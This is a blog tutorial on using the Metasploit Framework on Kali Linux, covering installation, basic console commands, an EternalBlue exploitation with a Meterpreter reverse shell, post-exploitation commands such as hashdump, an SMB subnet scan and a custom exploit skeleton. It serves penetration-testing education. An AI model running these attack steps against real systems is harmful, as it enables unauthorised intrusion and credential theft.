::: {}
# Using Metasploit Framework on Kali Linux: A Step-by-Step Guide {#using-metasploit-framework-on-kali-linux-a-step-by-step-guide .p-name}
:::

::: {.section .p-summary field="subtitle"}
The Metasploit Framework is a powerful tool that has become a staple in
the arsenal of cybersecurity professionals. Whether you're a...
:::

::::::: {.section .e-content field="body"}
:::::: {#9c75 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### **Using Metasploit Framework on Kali Linux: A Step-by-Step Guide** {#1288 .graf .graf--h3 .graf--leading .graf--title name="1288"}

<figure id="b97b" class="graf graf--figure graf-after--h3">
<img src="https://cdn-images-1.medium.com/max/800/0*JMp6M3bhF8g0DEXU"
class="graf-image" data-image-id="0*JMp6M3bhF8g0DEXU" data-width="686"
data-height="386" data-is-featured="true" />
</figure>

The Metasploit Framework is a powerful tool that has become a staple in
the arsenal of cybersecurity professionals. Whether you're a penetration
tester, security researcher, or simply interested in learning more about
cybersecurity, Metasploit provides a robust platform for discovering,
exploiting, and validating vulnerabilities in various systems. When
paired with Kali Linux, a penetration testing-focused operating system,
the potential for effective security testing becomes even more
pronounced.

In this comprehensive guide, we'll walk you through the basics of
Metasploit, how to install it on Kali Linux, and explore its various
features with step-by-step examples.

### What is Metasploit Framework? {#371c .graf .graf--h3 .graf-after--p name="371c"}

Metasploit is an open-source platform for developing, testing, and
executing exploit code. It was initially created by H.D. Moore in 2003
and has since become one of the most widely used tools in cybersecurity.
Metasploit includes various modules for exploiting known
vulnerabilities, payloads for executing code on target systems, and
auxiliary tools for tasks like scanning and fuzzing.

#### Key Components of Metasploit {#21d6 .graf .graf--h4 .graf-after--p name="21d6"}

1.  [**Exploit**: An exploit is a piece of code that takes advantage of
    a vulnerability in a system. Metasploit has a vast library of
    exploits that can target different platforms, applications, and
    network services.]{#4ca1}
2.  [**Payload**: A payload is the code that gets executed on the target
    system after a successful exploit. Metasploit has several payloads
    that range from opening a command shell to creating a persistent
    backdoor.]{#b6fa}
3.  [**Auxiliary**: Auxiliary modules are used for tasks like scanning,
    fuzzing, and performing brute-force attacks. They don't exploit a
    vulnerability but help in the information-gathering process.]{#63bb}
4.  [**Post-Exploitation**: After exploiting a system, Metasploit
    provides post-exploitation tools to help maintain access, gather
    further intelligence, or pivot to other systems in the
    network.]{#d6bf}

### Installing Metasploit on Kali Linux {#9dbe .graf .graf--h3 .graf-after--li name="9dbe"}

Before you begin using Metasploit, make sure you have a copy of Kali
Linux installed. Kali Linux typically comes with Metasploit
pre-installed, but if it's not available, you can install it with the
following steps:

**Update and Upgrade Kali Linux**: Open a terminal and update the system
repositories to ensure you have the latest package list:

`sudo apt update && sudo apt upgrade -y`{.markup--code .markup--p-code}

**Install Metasploit Framework**: If Metasploit is not already
installed, you can install it using the package manager:

`sudo apt install metasploit-framework`{.markup--code .markup--p-code}

**Verify Installation**: Once installed, you can verify it by running
the following command:

`msfconsole`{.markup--code .markup--p-code}

This command will start the Metasploit Console, the primary interface
for interacting with the framework.

### Getting Started with Metasploit {#b620 .graf .graf--h3 .graf-after--p name="b620"}

After installing Metasploit, it's time to familiarize yourself with the
msfconsole interface. This is the heart of the Metasploit Framework,
allowing you to search for exploits, configure them, and launch attacks.

#### Starting Metasploit {#028d .graf .graf--h4 .graf-after--p name="028d"}

To start Metasploit, open a terminal and type:

``` {#71ba .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
msfconsole
```

You'll be greeted with a banner and a prompt that looks like this:

``` {#b623 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
msf6 >
```

The `msf6`{.markup--code .markup--p-code} prompt indicates that you're
running Metasploit version 6. From here, you can execute a variety of
commands to interact with the framework.

#### Basic Commands in Metasploit {#914d .graf .graf--h4 .graf-after--p name="914d"}

Here are some essential commands to get you started:

- [**help**: Lists all available commands in Metasploit.]{#c4d1}
- [**search**: Searches for exploits, auxiliary modules, or payloads.
  For example, you can search for exploits related to SMB (Server
  Message Block) with:]{#b9e0}

`search smb`{.markup--code .markup--p-code}

- [**use**: Loads a specific module for use. After finding a module, you
  can load it by typing `use`{.markup--code .markup--li-code} followed
  by the module path. For example:]{#2f29}

`use exploit/windows/smb/ms17_010_eternalblue`{.markup--code
.markup--p-code}

- [**show options**: Shows all options that you can configure for a
  selected module.]{#0457}
- [**set**: Sets specific options for the module. For example, you can
  set the RHOST (remote host) option to specify the target IP
  address:]{#72bf}

`set RHOST 192.168.1.10`{.markup--code .markup--p-code}

**exploit**: Runs the selected module against the configured target.

### Step-by-Step Exploitation with Metasploit {#0955 .graf .graf--h3 .graf-after--p name="0955"}

To illustrate the capabilities of Metasploit, let's go through an
example of exploiting a vulnerable machine. For this demonstration,
we'll use the MS17--010 vulnerability, famously known as the
"EternalBlue" exploit, which affects Windows systems.

#### Step 1: Finding the Exploit {#87c5 .graf .graf--h4 .graf-after--p name="87c5"}

The first step is to search for the relevant exploit in Metasploit:

``` {#487e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
search ms17_010
```

Metasploit will return a list of exploits related to the MS17--010
vulnerability. In this case, we're interested in the
`ms17_010_eternalblue`{.markup--code .markup--p-code} exploit.

#### Step 2: Loading the Exploit Module {#bb58 .graf .graf--h4 .graf-after--p name="bb58"}

Once we've identified the exploit module, we need to load it with the
`use`{.markup--code .markup--p-code} command:

``` {#adb2 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
use exploit/windows/smb/ms17_010_eternalblue
```

#### Step 3: Configuring the Target {#4d53 .graf .graf--h4 .graf-after--pre name="4d53"}

After loading the exploit, use the `show options`{.markup--code
.markup--p-code} command to view the required settings:

``` {#ba48 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
show options
```

You'll see several options, including `RHOST`{.markup--code
.markup--p-code}, which specifies the target IP address. Set this option
to the IP of your target system:

``` {#ff88 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
set RHOST 192.168.1.20
```

#### Step 4: Setting the Payload {#e913 .graf .graf--h4 .graf-after--pre name="e913"}

Metasploit requires a payload to execute after the exploit. A common
payload is the reverse TCP shell, which gives you a command line
interface on the target machine. Set the payload as follows:

``` {#067a .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
set payload windows/x64/meterpreter/reverse_tcp
```

Now, set the `LHOST`{.markup--code .markup--p-code} (local host) option
to your Kali Linux IP address to receive the reverse shell:

``` {#2ac2 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
set LHOST 192.168.1.15
```

#### Step 5: Running the Exploit {#335e .graf .graf--h4 .graf-after--pre name="335e"}

With the exploit and payload configured, you're ready to launch the
attack. Use the `exploit`{.markup--code .markup--p-code} command to
execute it:

``` {#0610 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
exploit
```

If the exploit is successful, you'll receive a Meterpreter session,
granting you control over the target system.

#### Step 6: Post-Exploitation with Meterpreter {#553f .graf .graf--h4 .graf-after--p name="553f"}

After gaining access, you can use Meterpreter to perform various actions
on the target machine. Here are a few useful Meterpreter commands:

- [**sysinfo**: Displays information about the target system.]{#232d}
- [**getuid**: Shows the user ID you're running under on the
  target.]{#29e6}
- [**hashdump**: Dumps the password hashes from the target (requires
  elevated privileges).]{#1ad3}
- [**screenshot**: Takes a screenshot of the target desktop.]{#ce99}

To exit the Meterpreter session, type:

``` {#c694 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
exit
```

### Using Auxiliary Modules for Scanning {#4f7d .graf .graf--h3 .graf-after--pre name="4f7d"}

Metasploit isn't just for exploitation; it also includes auxiliary
modules that are useful for scanning and reconnaissance. Let's go
through an example of scanning for open SMB ports.

#### Step 1: Searching for the SMB Scanner {#449f .graf .graf--h4 .graf-after--p name="449f"}

Use the `search`{.markup--code .markup--p-code} command to find
auxiliary modules for SMB:

``` {#f0fa .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
search scanner smb
```

You'll see a list of SMB scanning modules. The
`auxiliary/scanner/smb/smb_version`{.markup--code .markup--p-code}
module is useful for identifying the SMB version on a target.

#### Step 2: Loading the SMB Scanner {#3459 .graf .graf--h4 .graf-after--p name="3459"}

Load the module with the `use`{.markup--code .markup--p-code} command:

``` {#f7ba .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
use auxiliary/scanner/smb/smb_version
```

#### Step 3: Setting the Target Range {#a35b .graf .graf--h4 .graf-after--pre name="a35b"}

Set the target range using the `RHOSTS`{.markup--code .markup--p-code}
option. This can be a single IP or a range:

``` {#648c .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
set RHOSTS 192.168.1.0/24
```

#### Step 4: Running the Scan {#9d9b .graf .graf--h4 .graf-after--pre name="9d9b"}

Execute the module with the `run`{.markup--code .markup--p-code}
command:

``` {#e4f1 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
run
```

Metasploit will scan the specified IP range, returning information about
any SMB services it finds. You can use this information to further
assess potential vulnerabilities.

### Exploiting Web Applications with Metasploit {#a26e .graf .graf--h3 .graf-after--p name="a26e"}

Metasploit also supports web application exploitation, with modules for
testing various vulnerabilities like SQL injection and file inclusion.
Here's an example of using a SQL injection module:

#### Step 1: Searching for SQL Injection Modules {#1bb1 .graf .graf--h4 .graf-after--p name="1bb1"}

Search for SQL injection modules with the following command:

``` {#da07 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
search sql_injection
```

#### Step 2: Selecting and Using a Module {#644e .graf .graf--h4 .graf-after--pre name="644e"}

Choose an appropriate module for the web application you're testing. For
example:

``` {#a0b1 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
use auxiliary/scanner/http/sqli
```

#### Step 3: Setting Target Options {#3a3a .graf .graf--h4 .graf-after--pre name="3a3a"}

As before, set the `RHOSTS`{.markup--code .markup--p-code} option to
specify the target web server

``` {#e308 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
set RHOSTS 192.168.1.25
```

Configure any other required options specific to the module and run the
scan.

### Creating Custom Exploits in Metasploit {#de03 .graf .graf--h3 .graf-after--p name="de03"}

Metasploit allows you to create custom exploits, which can be useful if
you've discovered a new vulnerability or need to customize an existing
exploit for specific conditions. Here's a simple example of creating a
custom exploit.

1.  [**Open a Text Editor**: Open a text editor and create a Ruby file
    for your exploit. You can name it `custom_exploit.rb`{.markup--code
    .markup--li-code}.]{#142f}
2.  [**Add Basic Exploit Structure**: Metasploit exploits are written in
    Ruby. Start with the basic structure:]{#e400}

`require 'msf/core' class MetasploitModule < Msf::Exploit::Remote def initialize(info = {}) super(update_info(info, 'Name' => 'Custom Exploit', 'Description' => 'This is a custom exploit', 'License' => MSF_LICENSE, 'Author' => 'Your Name', 'Payload' => { 'Space' => 1024 }, 'Platform' => 'win', 'Targets' => [ ['Windows XP', { 'Ret' => 0x41414141 }] ], 'DisclosureDate' => 'Oct 14 2024' )) end def exploit # Exploit code here end end`{.markup--code
.markup--p-code}

**Add Your Exploit Code**: Fill in the exploit method with your custom
code. Save the file and load it into Metasploit with:

- [`loadpath /path/to/your/custom_exploit`{.markup--code
  .markup--li-code}]{#69aa}

### Conclusion {#dd9e .graf .graf--h3 .graf-after--li name="dd9e"}

The Metasploit Framework on Kali Linux is a versatile and powerful tool
for penetration testing and vulnerability assessments. Whether you're
scanning for open ports, testing for SQL injection, or creating custom
exploits, Metasploit provides a wide range of capabilities for both
novice and advanced users.

This guide covered the basics, but Metasploit's true power lies in its
flexibility and community support. With regular updates, new modules,
and an active user base, Metasploit continues to be a critical tool in
the cybersecurity landscape. As you explore and practice, always
remember to operate within the legal boundaries and obtain permission
before testing any system.

### Promote and Collaborate on Cybersecurity Insights {#cf36 .graf .graf--h3 .graf-after--p name="cf36"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#ff9d .graf .graf--h3 .graf-after--p name="ff9d"}

[Vijay
Gupta](https://www.youtube.com%2F@www.youtube.com/@bevijaygupta){.markup--anchor
.markup--p-anchor
data-href="https://www.youtube.com%2F@www.youtube.com/@bevijaygupta"
rel="noopener ugc nofollow noopener" target="_blank"} is a cybersecurity
enthusiast with several years of experience in cyber security, [cyber
crime forensics
investigation](https://www.amazon.com/dp/B0CW4L574N){.markup--anchor
.markup--p-anchor data-href="https://www.amazon.com/dp/B0CW4L574N"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [October 14, 2024](https://medium.com/p/d47396f9dacd).

[Canonical
link](https://medium.com/@bevijaygupta/using-metasploit-framework-on-kali-linux-a-step-by-step-guide-d47396f9dacd){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
